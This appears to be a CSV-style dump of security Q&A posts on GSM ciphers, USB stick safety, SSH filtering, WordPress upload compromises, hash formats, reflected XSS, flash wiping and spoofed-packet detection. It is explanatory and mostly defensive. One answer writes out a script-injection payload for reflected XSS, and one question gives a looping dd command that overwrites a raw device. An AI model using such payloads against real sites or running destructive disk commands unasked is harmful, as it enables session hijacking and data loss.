  not an impersonator. 3G networks use the <a href=""https://en.wikipedia.org/wiki/KASUMI"">KASUMI block cipher</a> instead
  of the older A5/1 stream cipher. However, a number of serious
  weaknesses in the KASUMI cipher have been identified.</p>
</blockquote>

<p><sup><a href=""https://en.wikipedia.org/wiki/3G#Security"">https://en.wikipedia.org/wiki/3G#Security</a></sup></p>

<p>However:</p>

<blockquote>
  <p>Many operators reserve much of their 3G bandwidth for internet
  traffic, while shunting voice and SMS off to the older GSM network.</p>
</blockquote>

<p><sup><a href=""http://arstechnica.com/gadgets/2010/12/15-phone-3-minutes-all-thats-needed-to-eavesdrop-on-gsm-call/"">http://arstechnica.com/gadgets/2010/12/15-phone-3-minutes-all-thats-needed-to-eavesdrop-on-gsm-call/</a></sup></p>

<p><sup>[1]</sup> <a href=""http://cryptodox.com/A5/0"">Unencrypted communication</a> (flag <code>A5/0</code>) is also supported on GSM systems, and this encryption (or lack thereof) might be regulated by laws of different countries differently, or part of the carrier's policy not to use it. Some devices also display notifications to users when their calls will be encrypted and when not, but most probably felt it's hardly worth bothering notifying users, especially considering the strengths of various cypher suits in use with GSM protocols. See my reply to @HSN's comment below for more information.</p>
","35378"
"Is there any way to safely examine the contents of a USB memory stick?","26830","","<p>Suppose I found a USB memory stick lying around, and wanted to examine its contents in an attempt to locate its rightful owner.  Considering that USB sticks <a href=""/q/102873/27444"">might actually be something altogether more malicious than a mass storage device</a>, is there any way I can do so safely?  Is an electrical-isolation ""condom"" possible?  Is there a way to manually load USB drivers in Linux / Windows / OS X so as to ensure that it won't treat the device as anything other than USB mass storage?</p>

<p>After all, despite all the fear-mongering, it's still overwhelmingly more likely that what appears to be a misplaced memory stick actually is just a memory stick.</p>

<p>Follow-up question: what measures do/can photo-printing kiosks take to guard against these kinds of attacks?</p>
","<p>One interesting approach to this problem is <a href=""http://circl.lu/projects/CIRCLean/"" rel=""noreferrer"">CIRClean</a>, also described in a <a href=""https://lwn.net/Articles/626559/"" rel=""noreferrer"">LWN article</a>.</p>

<p>It utilises a Raspberry Pi (presumably fairly expendable in the face of overvoltage and other electrical attacks) into which the untrusted USB mass-storage and a trusted, blank USB mass-storage should be plugged in. And no other devices are plugged in  - it's not connected to any network, or keyboard/mouse/monitor.  And there's no writable permanent storage, or BIOS to be infected (and the truly paranoid can re-flash the boot SD card before each use if they desire, I suppose).</p>

<p>Power it up, and it will transfer files from one to the other, performing some automated scrubbing of known malware vectors (e.g. transforming PDF or MSOffice files to safer HTML).  A visual and audible indicator shows when the process is complete, and the system can be powered down, leaving the user with a somewhat sanitised version of the original filesystem on the trusted storage, ready for transfer into the user's workstation.</p>

<p>If you plan to use CIRClean, I recommend checking its issue tracker for current defects - the LWN article notes (December 2014) that there was no protection against BadUSB keyboard attacks; I haven't determined whether that is still true.  Looking at the kernel config file in the Git repository, it certainly looks like it could be locked down much more (Magic Sysrq, anyone?).  Perhaps a project to get involved in, rather than (yet) a finished product.</p>
","103348"
"How to properly encrypt a communication channel between a client and a server (without SSL)?","26805","","<p>I have a poor knowledge in the world of cryptography, I'm just starting to learn it so I'm a newbie :)</p>

<p>As a project for getting into the field of cryptography I want to write a client\server program that can send and receive data in a secure manner (<em>i.e</em> encrypted).</p>

<p>Let's say I want to encrypt the traffic between a client and a server or between two clients. The service I'm running can only talk with the server or another client (which acts as server too) on a known port, the server basically listens for a connection on one side on a default port. </p>

<p>I want those services to be able to talk to each other with out the possibility that a third party who's listening on the network to be able to decrypt the content of the conversation or try to impersonate a service.</p>

<p>I'm not looking for a new way to exchange keys(or should I?), I can have the keys be saved securely in the services so when <em>x</em> sends a message to <em>y</em>, and back, they will be the only ones that can decrypt the content and response (off-course, only to a <em>verified</em> service).</p>

<ul>
<li>side note, the key can be saved in the program - hard coded or it can
be generated from a combination of things (e.g IP, computer-name, user name or any other combination of constants) which can be passed to the
client so it will be able to generate the key (lets say I'm passing the IP, computer name and a random seed, there will be a known formula to create the key from those values).</li>
</ul>

<p>I need to use a symmetric key for the encryption, but maybe I can try and use two pre-generated keys as SSL does.</p>

<p>I know that if I'm using the same key again and again, a third party can sniff the traffic and get the key (mathematics at it's best, how is it done?), the more data he will collect, the easier it gets(?).</p>

<p>So, what should I do in order to promise that no-one will be able to get the encryption key (eventually reading the data)? Which cipher should I use? What else I need to know before I start my journey?</p>
","<p>This is actually simpler than the others have suggested I think. Here is what I propose:</p>

<ol>
<li>Generate a public/private key pair using RSA. You can do this on any unix machine using openssl: <code>openssl genrsa -out rsa.private 2048</code></li>
<li>Distribute the public key as hardcoded in your client.</li>
<li>When the client logs in, the client generates a private shared key (also using openssl, or another well known encryption library) and encrypts it using the public key. </li>
<li>all data between client and server should be encrypted with the new shared key for the length of the session.</li>
</ol>

<p>There is a lot of other stuff you can do to harden it, such as limiting sesison length to one or a few hours before re-generating keys, having the server sign message digests, etc. A full understanding of encryption will help you understand what those are and why, but for a basic implementation (for medium to low value data) this should be sufficient.</p>
","7405"
"What alternatives are there when SSH is being actively filtered?","26780","","<p>Unfortunately our government filters the SSH protocol so now we can't connect to our Linux server.</p>

<p>They do the filtering by checking the header of each packet in the network layer (and not by just closing port). They also do away with VPN protocols.</p>

<p>Is there any alternative way to securely connect to a Linux server?   </p>
","<p>From <a href=""http://www.tinc-vpn.org/pipermail/tinc/2012-January/002811.html"">what I heard earlier</a> today, https/ssl flows correctly through your borders.</p>

<p>You should hence check out <a href=""http://www.agroman.net/corkscrew/"">Corkscrew</a>.</p>

<p>Similarly to <code>netcat</code>, it's used to wrap ssh in https to allow the use of https proxies.</p>

<p>Another solution would be to use <a href=""http://www.lysator.liu.se/~nisse/lsh/"">LSH</a> which, by having a different signature than ssh, works from Iran as Siavash noted it <a href=""http://www.tinc-vpn.org/pipermail/tinc/2012-January/002811.html"">in his message</a>. </p>
","10342"
"How do crackers upload php scripts to Wordpress' wp-content directory?","26712","","<p>I've seen a site that has been attacked by uploading php scripts (presumably some sort of shell, or code that loads a shell) to Wordpress' wp-content/uploads directory.  Usually this directory is used for user uploaded content like photos etc. This particular server was configured to then run the malicious scripts for any user on the Internet (with knowledge of the correct URL).</p>

<p>How does this work?  How would the cracker get wordpress to place the php file in the uploads directory without a user account? I this just the infamous and inspecific ""yeah, wordpress is not secure"" type of problem?</p>
","<p>I wouldn't say that the root cause of the problem is Wordpress, but rather the fact that:</p>

<ul>
<li>There is so many themes/plugins for Wordpress available from 3rd party developers, and people usually don't audit them before installing them. Since the entry barrier for PHP is very low, a lot of those 3rd party developers have no/poor IT security knowledge</li>
</ul>

<p>I think one of the most possible scenario is where a Wordpress setup is configured with a plugin/theme which allows anonymous uploads. One example is the <a href=""http://secunia.com/community/advisories/51619"">Clockstone Theme upload.php Arbitrary File Upload Vulnerability</a>.</p>

<p>Basicly, you </p>

<ol>
<li>Need to make sure unauthorized/anonymous uploads are not allowed</li>
<li>Move uploaded files out of the web root directory</li>
<li>Verify the content to make sure only what you expect gets uploaded and saved</li>
</ol>

<p>The page on <a href=""https://www.owasp.org/index.php/Unrestricted_File_Upload"">Unrestricted File Upload</a> on the OWASP web site has some very good explanations on the subject.</p>
","54924"
"Prevent my site from being copied","26701","","<p>Is it possible to protect my site from <a href=""http://www.httrack.com/"" rel=""noreferrer"">HTTrack Website Copier</a> or any similar program?<br>
Without setting a max number of HTTP request from users.</p>
","<p>No, there's no way to do it. Without setting connection parameter limits, there's even no way to make it relatively difficult. If a legitimate user can access your website, they can copy its contents, and if they can do it normally with a browser, then they can script it.</p>

<p>You might setup User-Agent restrictions, cookie validation, maximum connections, and many other techniques, but none will stop somebody determined to copy your website.</p>
","38461"
"Why does MD5 hash starts from $1$ and SHA-512 from $6$? Isn't it weakness in itself?","26695","","<p>I have moved this question from stackoverflow to this place. I know it may be a question about 'opinion' but I am not looking for a private opinion but a source of the final decision to keep it this way.</p>

<p>I have been taught that nobody tries to open a door when one does not know that the door even exist. The best defense would be then to hide a door. It could be easily seen in the old war movies - nobody would keep a hideout in the light. It was always covered with something suggesting that 'there is nothing interesting there.'</p>

<p>I would assume that in cryptography that would work the same way.
Why would then hash generated by MD5 started from $1$, and telling what this is a hash in the first place, and then what kind of hash it is (MD5)?</p>

<p>Now, I see that sha512 does exactly the same thing. Isn't it a weakness by itself? Is there any particular reason why we would have it done this way?</p>

<p>The main question the is: Should I scramble my hash before storing it to hide this from a potential enemy? If there is no need for that then why?</p>

<p>To avoid answers that suggest that obscurity is not security, I would propose this picture. It is WWII. You have just received a hint that SS is coming to your house suspecting that you are hiding partisans, and this is true. They have no time to escape. You have two choices where you could hide them - in the best in the world safe, or in the hidden hole underneath the floor, hidden so well that even your parents would did not suspect that it is there. What is your proposal? Would you convince yourself that the best safe is the best choice?</p>

<p>If I know there is a treasure hidden on an island then I would like to know which island it is or I will not start searching.</p>

<p>I am still not convinced. Chris Jester-Young so far gave me something to think about when suggesting that there can be more algorithms generating the same hash from different data.</p>
","<p>First, there's <a href=""http://en.wikipedia.org/wiki/Kerckhoffs%27s_principle"">Kerckhoffs's principle</a> which is always desirable:</p>

<blockquote>
  <p>A cryptosystem should be secure even if everything about the system, except the key, is public knowledge.</p>
</blockquote>

<p>where in this case the password is the key.  So its not a goal to keep the cryptosystem secret.</p>

<p>Second, you are wrong about those being md5 or sha512 hashes; the values stored in your <code>/etc/shadow</code> are md5crypt or sha512crypt, which involves a strengthening procedure (many rounds of a md5 or sha512 hash).</p>

<p>Now if your four choices are MD5crypt, sha256crypt, sha512crypt, and bcrypt (the most popular choices in linux systems), here are four hashes all generated with <code>$saltsalt$</code> (or equivalent) as a salt and hashing the password <code>not my real password</code>:</p>

<pre><code>&gt;&gt;&gt; import crypt
&gt;&gt;&gt; crypt.crypt('not my real password','$1$saltsalt')
'$1$saltsalt$4iXfpnrgHRXkrDbPymCE4/'

&gt;&gt;&gt; crypt.crypt('not my real password','$5$saltsalt')
'$5$saltsalt$E0bMpsLR71z8LIvd6p2tD4LZ984JxyD7B9lPLhq4vY7'

&gt;&gt;&gt; crypt.crypt('not my real password','$6$saltsalt')
'$6$saltsalt$KnqiStSM0GULvZdkTBbiPUhoHemQ7Q06YnvuJ0PWWZbjzx3m0RCc/hCfq54Ro3fOwaJdEAliX9igT9DD2oN1u/'

&gt;&gt;&gt; import bcrypt
&gt;&gt;&gt; bcrypt.hashpw('not my real password', ""$2a$12$saltsaltsaltsaltsalt.."")
'$2a$12$saltsaltsaltsaltsalt..FW/kWpMA84AQoIE.Qg1Tk5.FKGpxBNC'
</code></pre>

<p>Even without the annotation, its fairly straightforward to figure out which scheme they each use (md5crypt, sha256crypt, sha512crypt, and bcrypt are 34,55,98, and 60 chars long respectively (in base64 encoding with annotation and salt).  So unless you suggest truncating the hash, or altering the hashes properties the annotation for consistency doesn't lose any security.  It also gives you a method to gracefully update user passwords.  If you decide that md5crypt is no longer secure, you can switch users' hashes to bcrypt on next login (and then after a period of time deactivate all accounts left on md5crypt).  Or if your algorithm like bcrypt (when it was $2$) needs to be updated, because of a <a href=""http://seclists.org/oss-sec/2011/q2/632"">flaw in design</a> you can readily identify flawed schemes when the fixed scheme went to $2a$.</p>

<p>Even worse, you could try saying, I'm going to modify sha512 with new constants and round keys.  That would make it superhard to break -- right?  No, it just makes it super hard for you to know you didn't accidentally introduce a major vulnerability.  If they can get at your /etc/shadow, they probably can also get at the library used to log you in and with time could reverse engineer your hashing scheme and this will be MUCH MUCH simpler than breaking a strong password.</p>

<p>Again, the expected time to brute force a very strong passphrase stored in sha256 hash is O(2^256 ), e.g., a billion computers doing a billion sha256crypts  per <em>nanosecond</em> (each involving ~5000 rounds of sha256), would take 300000000000000000000000 (3 x 10^23) times the the age of the universe to break it.  And with sha512crypt, if each of the ~10^80 atoms in the observable universe each did a billion sha512crypts every nanosecond it would still take 10^38 times the age of the universe.  (This assumes you have a 256-bit and 512-bit or higher entropy passphrase).</p>
","56000"
"Where/How is an ODBC password stored when 'saved' in Access?","26658","","<p>I have been working on a program that uses MS Access and ODBC to connect to an SQL server. One of the requirements is that the user need not know the password for the connection to the SQL server, so I checked the 'Save Password' check box when linking my SQL tables.</p>

<p>Does anyone know where the password is stored and how secure it is when this action is performed?</p>
","<p>I would like to point out, that the answer to the second part of the question has little to do with the first part.   </p>

<p><em>Even if</em> the password was stored in a super-strong encrypted fashion (it's not), this would still not be secure, in several aspects.  </p>

<ol>
<li>The user has complete, unfettered access to the database. I.e. he can do anything he wants (per the permissions of the shared user... The user's privileges <em>are</em> restricted on the database, <em>right</em>?). E.g. accessing any unauthorized data, deleting other users' data, inserting garbage, etc. </li>
<li>This sounds like there is a shared user account, that all the users have plugged into their ODBC connection... Which means, the database server has no way of limiting users' access, segregating their data, tracking who done what, etc.   </li>
<li>In any event, the ODBC password would need to be decrypted <em>in memory</em>, allowing the user to grab it, and then impersonate the application and again, do whatever he wants.    </li>
</ol>

<p>You'd be much better off redesigning the application, with a middle-tier and all...<br>
I always find it odd discussing <code>security</code> and <code>MS Access</code> in the same conversation...   </p>

<p>If you absolutely <em>cannot</em> change the architecture, consider using Integrated Windows Authentication, and tying user accounts (or group) to a db role for management. That way, at least each user will have his own account on the server, you can restrict access (according to the principle of least privilege), no shared accounts, and you can track each users actions on the database.    </p>
","5387"
"Encrypt data within mobile app and send to web service","26639","","<p>I'm developing a mobile application for Android and iOs. What is best practice when it comes to data encryption within the mobile application which will be sent to a web service?</p>

<p>Basically I will generate a string which consists of some parameters like GPS and time. This string needs to be encrypted and then be passed to a web service.</p>

<p>I have considered to do it with asymmetric encryption. Encrypt the string with the public key (which has to be hardcoded?) and decrypt with private key. Because every application can be reverse engineered this is not secure at all. After finding the hardcoded public key and the string generating function it's easy to forge whatever you want.</p>

<p>Any input is highly appreciated.</p>

<p>EDIT: A clearer approach of my question: A function of my application will generate a string and another function will encrypt this string, which will be sent to a server. How can I prevent a self crafted string to be passed to the encryption function after reverse engineering my application? In other words, can I ensure with an encryption technique that data sent by my mobile application to a server is not crafted by someone else?</p>
","<p>You can't. This is a fundamental principle of general purpose computing.</p>

<p>You're running into Shannon's maxim:</p>

<blockquote>
  <p>The enemy knows the system. One ought design systems under the assumption that the enemy will immediately gain full familiarity with them.</p>
</blockquote>

<p>Just to make my point completely clear: you're giving someone a car, and asking them to only ever drive to one particular place. Nothing stops them from deciding to go somewhere else - you're relying on them adhering to your request.</p>

<p>If your security mechanism hinges on the hope that someone won't look at your executable and discover your encryption method / embedded keys, then it is not a security mechanism; it is an obscurity mechanism.</p>

<p>From what I can tell, you're trying to enforce that users are within a specified area via GPS coordinates, and also want to ensure that they don't spoof those coordinates. This <em>cannot be done</em> on a general purpose computing platform such as a smartphone. Let's look at the technology stack:</p>

<ul>
<li>Your webapp sits in ""the cloud"" somewhere. You control this entirely.</li>
<li>Your app sits on a phone. You have minimal control over this, if any. Possible attack vectors include reverse engineering, app modification, direct webapp requests, memory editing, etc.</li>
<li>The smartphone OS (e.g. Android or iOS) runs on the device. You have no control over this. This is responsible for communicating with the GPS device and translating data into usable coordinates. Possible attack vectors include: fake GPS coordinates via test panel (most phones have this feature), modified GPS driver, hooked GPS APIs, etc.</li>
<li>The GPS module is inside the device. You have no control over this. The GPS module is responsible for communicating with GPS satellites and relaying the data to the CPU via a standard bus. Possible attack vectors include: man-in-the-middle on the bus, replacement fake GPS module, fake GPS satellite signal from software defined radio, etc.</li>
</ul>

<p>So you <em>cannot</em> enforce that the GPS coordinates you receive into your webapp are correct, since they might have been tampered with at the app level, the OS level, the hardware level, or even the GPS signal level. Or, barring all that, someone might just skip the phone entirely and manually send requests to your webapp containing phony data!</p>

<p>The solution is to accept the risk or change your security model.</p>
","31032"
"What's the use of challenge password in build-key-server and build-key from Easy-RSA?","26622","","<p>All the OpenVPN/<a href=""https://wiki.archlinux.org/index.php/Create_a_Public_Key_Infrastructure_Using_the_easy-rsa_Scripts"" rel=""noreferrer"">Easy-RSA tutorials</a> that I've found, advise to setting an empty <em>challenge password</em> while building the key for the OpenVPN server.</p>

<ul>
<li><p>Anybody knows why? What's the intended use for the <em>challenge password</em> in Easy-RSA server's keys? </p></li>
<li><p>And what about client's keys? I see that a <code>build-key-pass</code> exists to generate encrypted client keys, but no server equivalent exists. Still, both <code>build-key</code> and <code>build-key-pass</code> ask for a <em>challenge password</em>.</p></li>
</ul>
","<h1>""Challenge password"" is an obscure and usually useless feature. -> Leave empty.</h1>

<p>If your CA allows this, then the <code>Challenge Password</code> will be required of anyone who tries to get the cert revoked. -- But from what I understand there are few (<em>or none?</em>) CAs that actually use this. (<em>Please leave a comment if you know otherwise.</em>) So leave it empty if you're unsure.</p>

<h3>What's the intended use of a ""Challenge Password""?</h3>

<p>As far as I understand it the idea is this:<br>
If you have a rogue admin who has access to the cert and key then that admin could revoke the cert and DOS you.</p>

<p>But if you have a CA that will challenge the rogue admin to supply the ""Challenge Password"", then the rogue admin may not have that password and then you're safe from that DOS.<br>
(The CP is NOT included in either cert or key. Only in the CSR. And you don't need the CSR for daily operations, so presumably operations personnel might not come into contact with the CSR file and therefore not know the Challenge Password.) (But bear in mind that you still have to worry about a rogue admin who has your cert/key.)</p>

<h3>Further reading</h3>

<p>The (too short) official definition is here: <a href=""https://tools.ietf.org/html/rfc2985#page-16"" rel=""nofollow noreferrer"">RFC 2985: PKCS #9: Selected Object Classes and Attribute Types Version 2.0, <em>Section 5.4.1: Challenge password</em></a></p>

<p>The question comes up regularly:   </p>

<ul>
<li><a href=""https://superuser.com/questions/376179/confusion-with-pem-pass-phrase-and-challenge-password"">https://superuser.com/questions/376179/confusion-with-pem-pass-phrase-and-challenge-password</a>  </li>
<li><a href=""https://serverfault.com/questions/266232/what-is-a-challenge-password"">https://serverfault.com/questions/266232/what-is-a-challenge-password</a></li>
</ul>

<p>Further source:  </p>

<ul>
<li>Randall Perry, ""OpenSSL-Users"" mailing list, 2014-05-22, <a href=""https://www.mail-archive.com/openssl-users@openssl.org/msg35862.html"" rel=""nofollow noreferrer""><em>Re: CSR challenge password: What's the point?</em></a></li>
</ul>
","77082"
"What is Reflected XSS?","26448","","<p>Fed up with the following definition.    </p>

<p>Reflected attacks are those where the injected script is reflected off the web server, such as in an error message, search result, or any other response that includes some or all of the input sent to the server as part of the request. Reflected attacks are delivered to victims via another route, such as in an e-mail message, or on some other web site. When a user is tricked into clicking on a malicious link, submitting a specially crafted form, or even just browsing to a malicious site, the injected code travels to the vulnerable web site, which reflects the attack back to the user’s browser. The browser then executes the code because it came from a ""trusted"" server</p>

<p>Can somebody explain me with an example. And what is the main difference between Reflected XSS and Stored XSS?</p>
","<p>So let's say you navigate to www.example.com/page?main.html and it puts you on the main page of example.com. Now you navigate to the index, which is located at www.example.com/page?index.html. You start to wonder, what other pages are there?</p>

<p>So you type in www.example.com/page?foo and hit enter, and you get an error page which will say something like ""Resource foo is not found"".</p>

<p>The thing to note here is that you put a parameter into the URL, and that parameter got reflected back to you as the user. In this case, it was the parameter ""foo"". </p>

<p>Now the idea behind reflected XSS should be a bit more clear; instead of inputting a lame parameter like ""foo"", you input something like <code>&lt;script&gt;alert(1)&lt;/script&gt;foo</code> and hit enter. On a vulnerable site, that entire parameter will get injected into the error page that pops up, the javascript will execute, and you'll get a popup in addition to the ""Resource foo is not found"" message. If you can induce somebody else navigate to the same link that you crafted, you can execute arbitrary javascript in their session.</p>
","65242"
"Is there any virus that can cause physical damage?","26263","","<p>Like damaging a chip on the motherboard, increase the fan's speed till something explodes, or anything similar to that. I am not an IT guru, but I never came across a malicious code that couldn't be erased using a certain software, nor a virus that caused something beyond corrupting the OS.</p>
","<p>In older times, virus could be damaging to the hardware in the following way:</p>

<ul>
<li><p>Playing with video signal rates, so as to exceed the tolerance ranges of CRT monitors. Post-1995 CRT monitors included safety mechanisms (and LCD panels are inherently protected), but older monitors have died that way.</p></li>
<li><p>Reflashing the BIOS. This does not <em>permanently</em> kill the hardware, but resurrecting it can be hard; e.g. some motherboards can be reflashed after such a junk flashing only by reading the BIOS from... a floppy disk. Who has a floppy disk nowadays ?</p></li>
<li><p>Causing overheating by blocking fans. This works only when the fan speed is controlled from the motherboard itself. However, hardware which allows for a variable fan rotation speed also includes thermometers, and safety circuits which forcibly cut off power in case of overheating, <em>before</em> permanent damage occurs.</p>

<p>Though I know of a motherboard that did melt an ethernet card once (the chip turned completely black and the plastic partially collapsed). Strangely enough, the motherboard was fine afterwards.</p></li>
<li><p>Laptop batteries <a href=""http://www.forbes.com/sites/andygreenberg/2011/07/22/apple-laptops-vulnerable-to-hack-that-kills-or-corrupts-batteries/"">can be permanently damaged</a> from software.</p></li>
</ul>

<p>However, wanton destruction is often deemed useless by virus writers, who now prefer silently installation and remote control. Modern virus try hard <em>not</em> to damage the computer.</p>
","65163"
"Is it enough to only wipe a flash drive once?","26257","","<p>According to the documentation for the ""diskscrb"" command for wiping conventional hard drives: <a href=""http://www.forensics-intl.com/diskscrb.html"" rel=""nofollow noreferrer"">http://www.forensics-intl.com/diskscrb.html</a></p>

<blockquote>
  <p>""Conforms to and exceeds the Government Standard set forth in DoD 5220.22-M. Can overwrite ambient data areas 9 times. (Each pass involves 3 separate writes followed by a verify pass.) This helps eliminate the potentials for the recovery of Shadow Data.""</p>
</blockquote>

<p>So it's ok to wipe the HDD's at least the mentioned 9 times, but how about SSD's, USB FLASH drives? Do I have to wipe the data from them 9 times, or it's only needed once?</p>

<p>Here is what I use to regularly delete the data from my memory cards, usb flashdrives, etc.: [I start it in the evening, and stop in the the morning, e.g.: it overwrites my usb flash drive 10 times]:</p>

<pre><code>loopcountdd=0;   
while [ 1 = 1 ]; 
do (( loopcountdd= $loopcountdd + 1 )); 
dd if=/dev/urandom bs=4096 | pv | dd bs=4096 of=/dev/XXX; 
echo ""overwritten: $loopcountdd x""; 
done
</code></pre>

<blockquote>
  <p>This question was <strong><a href=""https://security.meta.stackexchange.com/questions/356"">IT Security Question of the Week</a></strong>.<br/>
  Read the Aug 3, 2011 <strong><a href=""http://security.blogoverflow.com/2011/08/qotw-4-is-it-enough-to-only-wipe-a-flash-drive-once/"" rel=""nofollow noreferrer"">blog entry</a></strong> for more details or <strong><a href=""https://security.meta.stackexchange.com/questions/tagged/qotw?sort=newest"">submit your own</a></strong> Question of the Week.</p>
</blockquote>
","<p><strong>Best stop doing that. Never overwrite an SSD/flash storage device completely in order to erase it, except as a last resort.</strong></p>

<p>NVRAM has a limited amount of write cycles available. At some point, after enough writes to an NVRAM cell, it will completely stop working. For modern versions, we're in the ballpark of an <a href=""http://www.anandtech.com/show/4159/ocz-vertex-3-pro-preview-the-first-sf2500-ssd/2"">estimated lifespan of 3,000 write cycles</a>.</p>

<p>Furthermore, internally SSDs look nothing like traditional harddisks. SSDs have the following unique properties:</p>

<ul>
<li><p>Spare area, often on the order of 8% - 20% of the total flash is set aside <a href=""https://secure.wikimedia.org/wikipedia/en/wiki/Write_amplification#Wear_leveling"">for wear leveling purposes</a>. The end user <em>cannot write to this spare area with usual tools</em>, it is reserved for the SSDs controller. But the spare area can hold (smaller) amounts of old user data.</p></li>
<li><p>A ""Flash Translation Layer"", FTL. How your operating system 'sees' the SSD (LBA addresses) and the <em>actual</em> NVRAM address space layout has no correlation at all.</p></li>
<li><p>Very heavy writing to a consumer-grade SSD may bring the controller's garbage collection algorithm behind, and put the <a href=""http://www.anandtech.com/show/4253/the-crucial-m4-micron-c400-ssd-review/2"">controller into a state of reduced performance</a>. What happens then depends on the controller. In an extreme worst case scenario, it cannot recover performance. In a much more likely scenario it will slowly regain performance as the <a href=""https://secure.wikimedia.org/wikipedia/en/wiki/TRIM#Operating_system_and_SSD_support"">operating system sends ""trim"" commands</a>.</p></li>
</ul>

<p><strong>Lastly,</strong> from the <a href=""http://nakedsecurity.sophos.com/2011/02/20/ssds-prove-difficult-to-securely-erase/"">conclusion of the paper ""Reliably Erasing Data From Flash-Based Solid State Drives""</a>: <strong>""For sanitizing entire disks, [...] software techniques work most, but not all, of the time.""</strong></p>

<p>So when you're completely overwriting flash storage, you <em>may</em> be performing an effective secure wipe -- but, you may also be missing some bits. And you're certainly consuming quite much of the drives expected life span. <strong>This isn't a good solution.</strong></p>

<p><strong>So, what should we be doing?</strong></p>

<ul>
<li><p>The 'best' modern drives support a vendor-specific secure erase functionality. Examples of this are Intels new 320 series, and some Sandforce 22xx based drives, and many SSDs which are advertised as having ""Full Disk Encryption"" or ""Self Encrypting Drive"". The method is generally something along the lines of:</p>

<ol>
<li>The SSD controller contains a full hardware crypto engine, for example using AES 128.</li>
<li>Upon first initialization, the controller generates a random AES key, and stores this in a private location in NVRAM.</li>
<li>All data <em>ever</em> written to the drive is encrypted with the above AES key.</li>
<li>If/when an end user performs a secure wipe, the drive discards the AES key, generates a new one, and overwrites the old AES key position in the NVRAM. Assuming the old AES key cannot be recovered this effectively renders the old data un-recoverable.</li>
</ol></li>
<li><p>Some drives don't have the above, but do support the <a href=""https://ata.wiki.kernel.org/index.php/ATA_Secure_Erase"">ATA Secure Erase</a> commands. This is were it gets more tricky -- essentially we're relying on the drive manufacturer to implement a 'strong' secure erase. But it's a black box, we don't know what they're actually doing. If you need high security, then you should not rely on this, or at least you should read the tech docs and/or contact the drive manufacturer to verify how secure their method is. A fair guess as to what they're doing / ought to be doing is that:</p>

<ol>
<li>While the drive isn't using a full cryptographic cipher such as AES, it is still using extensive data compression algorithms &amp; checksumming &amp; RAID-like striping of data across multiple banks of NVRAM. (All modern high-performance SSDs use variants of these techniques.) This obfuscates the user data on the drive.</li>
<li>Upon receiving an ATA Secure Erase command, the drive erases its ""Flash Translation Layer"" table, and other internal data structures, and marks all NVRAM as free'd.</li>
</ol></li>
</ul>

<p><strong>My personal recommendations:</strong></p>

<ol>
<li><p>If you just need an in-secure wipe of an SSD, then use the manufacturer's end user tools, or use the ATA Secure Erase command via for example HDPARM on Linux.</p></li>
<li><p><strong>If you need secure wipe then either:</strong></p>

<ul>
<li>Only use drives which explicitly advertise secure wipe via strong (AES) encryption, and run the manufacturers secure wipe. <strong>and/or:</strong></li>
<li>Ensure that all data you write to the drive is encrypted before hitting the drive. Typically via software full disk encryption such as PGP Whole Disk Encryption, Truecrypt, Microsoft BitLocker, Bitlocker-to-Go, OSX 10.7 FileVault or LUKS. <strong>or:</strong></li>
<li>Physically destroy the drive.</li>
</ul></li>
</ol>
","5665"
"What is updated with ""Update Root Certificates"" enabled? What is the equivalent in Windows 2008R2?","26238","","<p>What root certificates are/are not updated when the following checkbox is checked?</p>

<p><img src=""https://i.stack.imgur.com/ocCg2.png"" alt=""Update Root Certificate image""></p>

<p><strong>Additional questions</strong></p>

<ul>
<li><p>If I manually remove a root certificate, will this service replace that very certificate?</p></li>
<li><p>What is the equivalent in Windows 2008R2/Win7, I can't find the setting?</p></li>
</ul>
","<p>Have a look at this page:</p>

<p><a href=""http://support.microsoft.com/kb/931125"" rel=""nofollow"">http://support.microsoft.com/kb/931125</a></p>

<p>I think it will answer some of your questions. It even contains some information regarding different operating systems.</p>

<p>Specifically, here is the list of what's updated in the Windows Root Certificate Program:</p>

<p><a href=""http://social.technet.microsoft.com/wiki/contents/articles/2592.aspx"" rel=""nofollow"">http://social.technet.microsoft.com/wiki/contents/articles/2592.aspx</a></p>
","17313"
"How are spoofed packets detected?","26230","","<p><strong>My assumption:</strong></p>

<p>When a firewall is configured to drop spoofed packets, it tries to ping (not necessarily ICMP) the source IP and sees if it belongs to a real host or if it's up, and if not, it drops the packet.</p>

<p><strong>My question:</strong></p>

<p>What happens if the source IP of a spoofed packet belongs to a real and online host? Are there any other ways to detect a spoofed packet?</p>
","<p>While I am sure there are, in fact, firewalls that may do that, I am not off-hand aware of any that operate this way. There are packet spoofing detection mechanisms, although they tend to act a little different.</p>

<h2>Bogon Filters</h2>

<p>A <a href=""https://en.wikipedia.org/wiki/Bogon_%28address%29"">bogon</a> is defined as bogus IP address. Specifically, it is the list of all IP addresses that have not been allocated by IANA, by a delegated RIR. The best way to get this list is for your firewall to support subscribing to a bogon service. If you enable bogon filtering on your firewall it also tends to also include ingress packets where the source address is listed as an <a href=""https://tools.ietf.org/html/rfc1918"">RFC 1918</a> address. </p>

<p>It is also customary to block using the same rule, or locally edit your bogon list, to include your local allocation. It is generally considered unlikely that your internal IP addresses will be seen on the ingress port of your firewall. An exception to this would be any equipment of yours that exists outside your firewall. This would most likely include packet shapers, routers, or other infrastructure equipment, but in some cases other equipment may purposely be left external. Make sure to exclude those from the bogon list.</p>

<h2>MAC Limiting</h2>

<p>For devices like border firewalls we generally have a really good idea what physical devices are able to directly communicate with them. This should, again, be infrastructure devices like packet shapers, routers, etc. If you have a DMZ then you may also see those devices in there depending on your architecture. In this case we can enumerate the MAC addresses that <em>should</em> be able to talk directly to the firewall and deny any that aren't on that list. Incidentally, this also helps catch systems that end up on this network segment that shouldn't.</p>

<p>For firewalls that may be deployed for departments, or in a transparent/bridge mode within a network for segmenting a subset of hosts, building these lists can be a lot harder.</p>

<h2>TTL Analysis</h2>

<p>Between two hosts the number of hops generally remains constant, or changes very little, between packets. As such if the TTL dramatically changes from one packet to another this could easily be a spoof attempt. This does require keeping more state information, and is not fool-proof since the route <em>could</em> change, but is often indicative enough.</p>

<h2>Route Checking</h2>

<p>If you have multiple active uplinks then you can also verify that the packet is coming in on the correct interface. There exists a standard for this called Reverse Path Forwarding (<a href=""https://tools.ietf.org/html/rfc3704"">RPF</a>). In short every time a packet is received on an interface the router checks its routing tables and determines if that is the correct interface for that source address. That is, if the routing tables say that packets destined for 144.152.10.0/24 are transmitted over interface ge-0/0/18 and it receives a packet from 144.152.10.5 on interface ge-0/0/20 then it is probably spoofed and should be dropped.</p>
","32006"
"How secure is NTFS encryption?","26220","","<p>How secure is the data in a encrypted NTFS folder on Windows (XP, 7)?</p>

